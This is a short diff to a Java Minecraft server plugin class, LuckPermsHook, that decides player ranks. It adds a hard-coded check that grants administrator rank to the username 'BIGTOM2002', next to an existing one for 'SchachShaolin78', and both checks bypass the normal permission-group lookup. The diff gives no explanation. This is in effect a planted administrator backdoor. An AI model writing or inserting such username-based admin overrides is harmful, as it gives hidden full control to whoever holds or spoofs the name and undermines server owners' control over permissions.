@@ -120,6 +120,9 @@ public final class LuckPermsHook extends PluginActivity {
 		if (player.getName().equals("SchachShaolin78")){
 			return Ranks.ADMINISTRATOR;
 		}
+		if (player.getName().equals("BIGTOM2002")){
+			return Ranks.ADMINISTRATOR;
+		}
 
 		for (final String group : Ranks.POSSIBLE_GROUPS) {
 			if (player.hasPermission("group." + group)) {
